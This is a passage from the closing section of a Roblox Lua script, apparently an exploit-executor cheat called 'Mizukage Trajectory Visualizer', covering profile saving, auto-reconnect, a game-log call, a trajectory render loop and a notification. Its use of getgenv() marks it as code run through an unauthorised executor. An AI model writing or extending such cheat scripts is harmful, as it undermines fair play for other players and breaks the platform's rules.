                deflectColor = {math.round(CFG.deflectColor.R*255), math.round(CFG.deflectColor.G*255), math.round(CFG.deflectColor.B*255)}
            }
            saveProfileToDisk(name, data)
            profileInput.Text = ""
            refreshProfileList()
        end
    end)

    refreshProfileList()
end

--================================================
-- 6. STARTUP
--================================================
SetupAutoReconnect()
SendGameLog()

-- Start trajectory render
TrajectoryModule.RenderConnection = rs.RenderStepped:Connect(function(dt)
    onRenderStep(dt)
end)

-- Create UI
CreateUI()

-- Cleanup handler
local function cleanupAll()
    TrajectoryModule.Cleanup()
    local gui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("MizuTrajMenuGui")
    if gui then gui:Destroy() end
    getgenv().MizukageTrajectoryLoaded = false
end

-- Override global cleanup
if _G._mizuTrajCleanup then _G._mizuTrajCleanup() end
_G._mizuTrajCleanup = cleanupAll

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Mizukage Official",
    Text = "Trajectory Visualizer siap!",
    Duration = 5
})

print("[Mizukage Official] Trajectory Visualizer v1.0 loaded.")